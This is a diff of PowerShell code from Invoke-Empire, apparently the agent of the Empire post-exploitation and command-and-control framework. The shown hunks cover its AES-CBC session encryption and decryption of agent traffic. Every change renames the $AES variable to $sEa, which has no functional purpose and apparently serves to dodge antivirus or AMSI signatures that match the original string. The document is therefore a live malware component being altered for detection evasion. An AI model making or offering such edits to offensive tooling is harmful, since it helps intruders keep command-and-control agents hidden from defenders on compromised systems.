@@ -602,15 +602,15 @@ function Invoke-Empire {
         # get a random IV
         $IV = [byte] 0..255 | Get-Random -count 16;
         try {
-            $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+            $sEa=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
         }
         catch {
-            $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+            $sEa=New-Object System.Security.Cryptography.RijndaelManaged;
         }
-        $AES.Mode = "CBC";
-        $AES.Key = $Encoding.GetBytes($SessionKey);
-        $AES.IV = $IV;
-        $ciphertext = $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
+        $sEa.Mode = "CBC";
+        $sEa.Key = $Encoding.GetBytes($SessionKey);
+        $sEa.IV = $IV;
+        $ciphertext = $IV + ($sEa.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
         # append the MAC
         $HMAC.Key = $Encoding.GetBytes($SessionKey);
         $ciphertext + $hmac.ComputeHash($ciphertext)[0..9];
@@ -631,15 +631,15 @@ function Invoke-Empire {
             # extract the IV
             $IV = $inBytes[0..15];
             try {
-                $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+                $sEa=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
             }
             catch {
-                $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+                $sEa=New-Object System.Security.Cryptography.RijndaelManaged;
             }
-            $AES.Mode = "CBC";
-            $AES.Key = $Encoding.GetBytes($SessionKey);
-            $AES.IV = $IV;
-            ($AES.CreateDecryptor()).TransformFinalBlock(($inBytes[16..$inBytes.length]), 0, $inBytes.Length-16)
+            $sEa.Mode = "CBC";
+            $sEa.Key = $Encoding.GetBytes($SessionKey);
+            $sEa.IV = $IV;
+            ($sEa.CreateDecryptor()).TransformFinalBlock(($inBytes[16..$inBytes.length]), 0, $inBytes.Length-16)
         }
     }
 
